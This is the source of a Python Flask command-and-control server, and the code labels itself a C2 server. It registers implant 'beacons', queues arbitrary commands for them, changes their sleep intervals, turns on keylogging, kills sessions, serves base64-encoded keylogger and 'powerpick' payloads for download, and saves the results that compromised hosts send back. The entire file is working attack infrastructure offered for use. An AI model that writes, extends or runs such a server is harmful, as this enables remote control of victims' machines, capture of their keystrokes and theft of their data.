from flask import Flask, request, abort, Response
from base64 import b64encode

import json


global ses
ses = {}

global tasklist
tasklist = {}

global sleeplist
sleeplist = {}

global keylist
keylist = []

global kill_list
kill_list = []

def add_host(guid, IP):
    ses[IP] = guid


# init instance of class
app = Flask(__name__)


@app.route('/login', methods=['GET'])
def login():
    guid = request.args.get('new')
    if not guid:
        abort(404)
    else:
        add_host(guid, request.remote_addr)
        return f"", 200
    
    print("New host added")


# I'll be using this route to check-in with beacon, task him, and set his sleep time
@app.route('/check', methods=['GET'])
def check_in():
    ip = request.remote_addr
    if ip in sleeplist:
        sleep = sleeplist[ip]
        del sleeplist[ip]
        resp = Response()
        resp.headers["X-Connection-State"] = sleep
        return resp, 204 # status code to change sleep time
    elif ip in tasklist:
        command = tasklist[ip]
        del tasklist[ip]
        resp = Response()
        resp.headers["X-Tasks"] = command
        return resp, 204
    elif ip in keylist:
        keylist.remove(ip)
        resp = Response()
        resp.headers["X-Logging"] = True
        return resp, 204
    elif ip in kill_list:
        kill_list.remove(ip)
        del ses[ip]
        resp = Response()
        resp.headers["X-Connection-Close"] = True
        return resp, 204
    else:
        return "", 200 # status code to inform to do nothing, stay still

@app.route('/results', methods=['POST'])    
def results():
    data = request.get_json()
    print(data)
    with open("results.json", "w") as f:
        json.dump(data, f)
    return "",200

# just for testing purposes
@app.route('/health-check', methods=['GET'])
def hello_world():
    return "<p>C2 server is UP and Running!</p>", 200

@app.route('/sessions', methods=['GET'])
def sessions():
    return ses, 200

@app.route('/transfer', methods=['GET'])
def transfer_powerpick():
    with open("transfers/powerpick.py", "rb") as f:
        content = f.read()
        data = b64encode(content)
    
    return data, 200

@app.route('/log', methods=['GET'])
def transfer_keylogger():
    with open("transfers/keylogger.py", "rb") as f:
        content = f.read()
        data = b64encode(content)
    
    return data, 200

@app.route('/kill', methods=['GET'])
def kill_session():
    ip = request.args.get('session')
    kill_list.append(ip)

    return '{"status": "OK"}', 200


@app.route('/sleep', methods=['GET'])
def set_sleep_time():
    ip = request.args.get('session')
    sleep_time = request.args.get('time')
    sleeplist[ip] = sleep_time

    return '{"status": "OK"}', 200


@app.route('/keylogger', methods=['GET'])
def keylogger():
    ip = request.args.get('session')
    keylist.append(ip)

    return '{"status": "OK"}', 200

@app.route('/exec', methods=['POST'])
def exec_command():
    data = request.get_json()
    for ip,command in data.items():
        tasklist[ip] = command
    
    return '{"status": "OK"}', 200



if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8000)
